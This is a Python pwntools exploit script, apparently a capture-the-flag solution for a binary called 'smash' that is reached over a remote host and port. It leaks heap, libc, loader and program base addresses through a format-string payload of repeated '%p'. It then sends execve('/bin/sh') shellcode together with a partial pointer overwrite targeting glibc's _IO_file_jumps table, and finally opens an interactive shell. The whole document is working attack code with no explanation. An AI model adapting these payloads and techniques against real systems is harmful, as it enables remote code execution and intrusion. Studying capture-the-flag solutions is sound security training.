#!/usr/bin/env python
#encoding: utf-8;

from pwn import *
import sys

FILENAME = "./smash"
LIBCNAME = "./libc-2.31.so"

hosts = ("pwn01.chal.ctf.westerns.tokyo","localhost","localhost")
ports = (29246,12300,23947)
rhp1 = {'host':hosts[0],'port':ports[0]}    #for actual server
rhp2 = {'host':hosts[1],'port':ports[1]}    #for localhost 
rhp3 = {'host':hosts[2],'port':ports[2]}    #for localhost running on docker
context(os='linux',arch='amd64')
binf = ELF(FILENAME)
libc = ELF(LIBCNAME) if LIBCNAME!="" else None


## utilities #########################################

def hoge():
  pass

## exploit ###########################################

def exploit():
  global c

  # leak all
  off_xsputn = 0x38
  off_vtable = 0xe8
  name = "%p %p %p %p %p %p %p %p %p %p"
  yesno = b""
  message = "message"
  addr_num = len(name.split(" "))

  c.recvuntil("Input name > ")
  c.send(name)
  addrs = c.recvline().rstrip().split(" ")

  heapbase = int(addrs[0], 16) - 0x2c0
  progbase = int(addrs[6], 16) - 0x216
  stackbase = int(addrs[5], 16)
  libcbase = int(addrs[8], 16) - 0x270b3
  ldbase = int(addrs[9], 16) - 0x2d620
  io_file_jumps = libcbase + 0x1ed4a0
  stdout = libcbase + 0x1ec6a0
  print("[+] heapbase: {}".format(hex(heapbase)))
  print("[+] progbase: {}".format(hex(progbase)))
  print("[+] stackbase?: {}".format(hex(stackbase)))
  print("[+] libcbase: {}".format(hex(libcbase)))
  print("[+] ldbase: {}".format(hex(ldbase)))
  print("[+] _IO_file_jumps: {}".format(hex(io_file_jumps)))


  # inject shellcode
  shellcode = '\xf3\x0f\x1e\xfa\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
  yesno += shellcode
  yesno += "A"*(0x30-len(yesno))
  yesno += p64(io_file_jumps + off_xsputn + 8)[:-1]
  c.recvuntil("[y/n] ")
  c.send(yesno)


## main ##############################################

if __name__ == "__main__":
    global c
    
    if len(sys.argv)>1:
      if sys.argv[1][0]=="d":
        cmd = """
          set follow-fork-mode parent
        """
        c = gdb.debug(FILENAME,cmd)
      elif sys.argv[1][0]=="r":
        c = remote(rhp1["host"],rhp1["port"])
      elif sys.argv[1][0]=="v":
        c = remote(rhp3["host"],rhp3["port"])
    else:
        c = remote(rhp2['host'],rhp2['port'])
    exploit()
    c.interactive()
